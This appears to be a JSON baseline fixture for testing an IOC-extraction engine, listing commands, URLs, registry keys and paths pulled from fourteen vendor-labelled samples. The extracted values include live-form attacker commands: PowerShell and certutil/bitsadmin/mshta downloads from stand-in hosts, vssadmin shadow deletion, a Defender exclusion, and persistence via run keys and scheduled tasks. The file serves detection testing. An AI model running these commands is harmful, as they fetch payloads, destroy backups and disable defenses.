@@ -1,0 +1,448 @@
+{
+  "corpus_id": "vendor-v1",
+  "engine_probed": "services.ida.artifact_splitter::split_artifacts",
+  "entries": [
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "cmd.exe /c wmic process where name='lsass.exe' call getowner",
+            "defanged": false,
+            "line": 3,
+            "value": "cmd.exe /c wmic process where name='lsass.exe' call getowner"
+          },
+          {
+            "canonical": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services /f",
+            "defanged": false,
+            "line": 5,
+            "value": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services /f"
+          }
+        ],
+        "registry_key": [
+          {
+            "canonical": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\f",
+            "defanged": false,
+            "line": 5,
+            "value": "HKLM\\SYSTEM\\CurrentControlSet\\Services /f"
+          }
+        ]
+      },
+      "fixture_id": "talos.001",
+      "n_artifacts": 3,
+      "summary": {
+        "command": 2,
+        "registry_key": 1
+      },
+      "vendor": "talos"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "certutil.exe -urlcache -split -f http://drop/y.exe",
+            "defanged": false,
+            "line": 4,
+            "value": "certutil.exe -urlcache -split -f http://drop/y.exe"
+          },
+          {
+            "canonical": "powershell.exe -nop -w hidden -c iex(iwr http://c2.example.com/x)",
+            "defanged": false,
+            "line": 3,
+            "value": "powershell.exe -nop -w hidden -c iex(iwr http://c2.example.com/x)"
+          },
+          {
+            "canonical": "schtasks /create /tn Updater /tr C:\\y.exe /sc onlogon",
+            "defanged": false,
+            "line": 5,
+            "value": "schtasks /create /tn Updater /tr C:\\y.exe /sc onlogon"
+          }
+        ],
+        "file_path": [
+          {
+            "canonical": "C:\\y.exe",
+            "defanged": false,
+            "line": 5,
+            "value": "C:\\y.exe"
+          }
+        ],
+        "url": [
+          {
+            "canonical": "http://c2.example.com/x",
+            "defanged": false,
+            "line": 3,
+            "value": "http://c2.example.com/x"
+          },
+          {
+            "canonical": "http://drop/y.exe",
+            "defanged": false,
+            "line": 4,
+            "value": "http://drop/y.exe"
+          }
+        ]
+      },
+      "fixture_id": "talos.002",
+      "n_artifacts": 6,
+      "summary": {
+        "command": 3,
+        "file_path": 1,
+        "url": 2
+      },
+      "vendor": "talos"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "vssadmin delete shadows /all /quiet",
+            "defanged": false,
+            "line": 3,
+            "value": "vssadmin delete shadows /all /quiet"
+          }
+        ]
+      },
+      "fixture_id": "talos.003",
+      "n_artifacts": 1,
+      "summary": {
+        "command": 1
+      },
+      "vendor": "talos"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "cmd.exe /c schtasks /create /s 10.0.0.1 /u corp\\alice /tn X /tr y.bat",
+            "defanged": false,
+            "line": 3,
+            "value": "cmd.exe /c schtasks /create /s 10.0.0.1 /u corp\\alice /tn X /tr y.bat"
+          },
+          {
+            "canonical": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows /v Foo /d bar /f",
+            "defanged": false,
+            "line": 4,
+            "value": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows /v Foo /d bar /f"
+          }
+        ],
+        "ip": [
+          {
+            "canonical": "10.0.0.1",
+            "defanged": false,
+            "line": 3,
+            "value": "10.0.0.1"
+          }
+        ],
+        "registry_key": [
+          {
+            "canonical": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows \\v Foo \\d bar \\f",
+            "defanged": false,
+            "line": 4,
+            "value": "HKLM\\SOFTWARE\\Microsoft\\Windows /v Foo /d bar /f"
+          }
+        ]
+      },
+      "fixture_id": "securelist.001",
+      "n_artifacts": 4,
+      "summary": {
+        "command": 2,
+        "ip": 1,
+        "registry_key": 1
+      },
+      "vendor": "securelist"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "mshta.exe http://malicious/x.hta",
+            "defanged": false,
+            "line": 4,
+            "value": "mshta.exe http://malicious/x.hta"
+          },
+          {
+            "canonical": "rundll32.exe C:\\Users\\Public\\gopher.dll,#1",
+            "defanged": false,
+            "line": 3,
+            "value": "rundll32.exe C:\\Users\\Public\\gopher.dll,#1"
+          }
+        ],
+        "file_path": [
+          {
+            "canonical": "C:\\Users\\Public\\gopher.dll",
+            "defanged": false,
+            "line": 3,
+            "value": "C:\\Users\\Public\\gopher.dll"
+          }
+        ],
+        "url": [
+          {
+            "canonical": "http://malicious/x.hta",
+            "defanged": false,
+            "line": 4,
+            "value": "http://malicious/x.hta"
+          }
+        ]
+      },
+      "fixture_id": "securelist.002",
+      "n_artifacts": 4,
+      "summary": {
+        "command": 2,
+        "file_path": 1,
+        "url": 1
+      },
+      "vendor": "securelist"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d y",
+            "defanged": false,
+            "line": 3,
+            "value": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d y"
+          },
+          {
+            "canonical": "schtasks /create /tn UpdateSvc /tr C:\\y.exe /sc daily /st 09:00",
+            "defanged": false,
+            "line": 4,
+            "value": "schtasks /create /tn UpdateSvc /tr C:\\y.exe /sc daily /st 09:00"
+          }
+        ],
+        "file_path": [
+          {
+            "canonical": "C:\\y.exe",
+            "defanged": false,
+            "line": 4,
+            "value": "C:\\y.exe"
+          }
+        ],
+        "registry_key": [
+          {
+            "canonical": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\v X \\d y",
+            "defanged": false,
+            "line": 3,
+            "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d y"
+          }
+        ]
+      },
+      "fixture_id": "securelist.003",
+      "n_artifacts": 4,
+      "summary": {
+        "command": 2,
+        "file_path": 1,
+        "registry_key": 1
+      },
+      "vendor": "securelist"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "curl -sk https://c2.example.org/beacon -o /tmp/b",
+            "defanged": false,
+            "line": 3,
+            "value": "curl -sk https://c2.example.org/beacon -o /tmp/b"
+          }
+        ],
+        "url": [
+          {
+            "canonical": "https://c2.example.org/beacon",
+            "defanged": false,
+            "line": 3,
+            "value": "https://c2.example.org/beacon"
+          }
+        ]
+      },
+      "fixture_id": "mandiant.001",
+      "n_artifacts": 2,
+      "summary": {
+        "command": 1,
+        "url": 1
+      },
+      "vendor": "mandiant"
+    },
+    {
+      "by_type": {
+        "registry_key": [
+          {
+            "canonical": "HKEY_LOCAL_MACHINE\\SAM C",
+            "defanged": false,
+            "line": 3,
+            "value": "HKLM\\SAM C"
+          },
+          {
+            "canonical": "HKEY_LOCAL_MACHINE\\SECURITY C",
+            "defanged": false,
+            "line": 4,
+            "value": "HKLM\\SECURITY C"
+          }
+        ]
+      },
+      "fixture_id": "mandiant.002",
+      "n_artifacts": 2,
+      "summary": {
+        "registry_key": 2
+      },
+      "vendor": "mandiant"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "powershell.exe -c Add-MpPreference -ExclusionPath C:\\",
+            "defanged": false,
+            "line": 3,
+            "value": "powershell.exe -c Add-MpPreference -ExclusionPath C:\\"
+          }
+        ]
+      },
+      "fixture_id": "microsoft.001",
+      "n_artifacts": 1,
+      "summary": {
+        "command": 1
+      },
+      "vendor": "microsoft"
+    },
+    {
+      "by_type": {},
+      "fixture_id": "microsoft.002",
+      "n_artifacts": 0,
+      "summary": {},
+      "vendor": "microsoft"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "certutil -decode a.b64 a.exe",
+            "defanged": false,
+            "line": 3,
+            "value": "certutil -decode a.b64 a.exe"
+          },
+          {
+            "canonical": "wmic process call create a.exe",
+            "defanged": false,
+            "line": 4,
+            "value": "wmic process call create a.exe"
+          }
+        ]
+      },
+      "fixture_id": "elastic.001",
+      "n_artifacts": 2,
+      "summary": {
+        "command": 2
+      },
+      "vendor": "elastic"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "reg add HKCU\\Software\\Classes\\CLSID\\{X}\\InprocServer32 /d y.dll",
+            "defanged": false,
+            "line": 3,
+            "value": "reg add HKCU\\Software\\Classes\\CLSID\\{X}\\InprocServer32 /d y.dll"
+          },
+          {
+            "canonical": "regsvr32 /s y.dll",
+            "defanged": false,
+            "line": 4,
+            "value": "regsvr32 /s y.dll"
+          }
+        ],
+        "registry_key": [
+          {
+            "canonical": "HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\",
+            "defanged": false,
+            "line": 3,
+            "value": "HKCU\\Software\\Classes\\CLSID\\"
+          }
+        ]
+      },
+      "fixture_id": "elastic.002",
+      "n_artifacts": 3,
+      "summary": {
+        "command": 2,
+        "registry_key": 1
+      },
+      "vendor": "elastic"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAA==",
+            "defanged": false,
+            "line": 3,
+            "value": "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAA=="
+          },
+          {
+            "canonical": "net use \\\\target\\c$ /user:admin pwd123",
+            "defanged": false,
+            "line": 4,
+            "value": "net use \\\\target\\c$ /user:admin pwd123"
+          }
+        ],
+        "file_path": [
+          {
+            "canonical": "\\\\target\\c",
+            "defanged": false,
+            "line": 4,
+            "value": "\\\\target\\c"
+          }
+        ]
+      },
+      "fixture_id": "huntress.001",
+      "n_artifacts": 3,
+      "summary": {
+        "command": 2,
+        "file_path": 1
+      },
+      "vendor": "huntress"
+    },
+    {
+      "by_type": {
+        "command": [
+          {
+            "canonical": "bitsadmin /transfer j http://drop/x.exe C:\\Users\\Public\\x.exe",
+            "defanged": false,
+            "line": 3,
+            "value": "bitsadmin /transfer j http://drop/x.exe C:\\Users\\Public\\x.exe"
+          }
+        ],
+        "file_path": [
+          {
+            "canonical": "C:\\Users\\Public\\x.exe",
+            "defanged": false,
+            "line": 3,
+            "value": "C:\\Users\\Public\\x.exe"
+          },
+          {
+            "canonical": "C:\\Users\\Public\\x.exe",
+            "defanged": false,
+            "line": 4,
+            "value": "C:\\Users\\Public\\x.exe"
+          }
+        ],
+        "url": [
+          {
+            "canonical": "http://drop/x.exe",
+            "defanged": false,
+            "line": 3,
+            "value": "http://drop/x.exe"
+          }
+        ]
+      },
+      "fixture_id": "huntress.002",
+      "n_artifacts": 4,
+      "summary": {
+        "command": 1,
+        "file_path": 2,
+        "url": 1
+      },
+      "vendor": "huntress"
+    }
+  ],
+  "fixture_count": 14,
+  "purpose": "ADR-004 Amendment A1 \u00b7 IOC extraction baseline",
+  "schema_version": "1.0"
+}
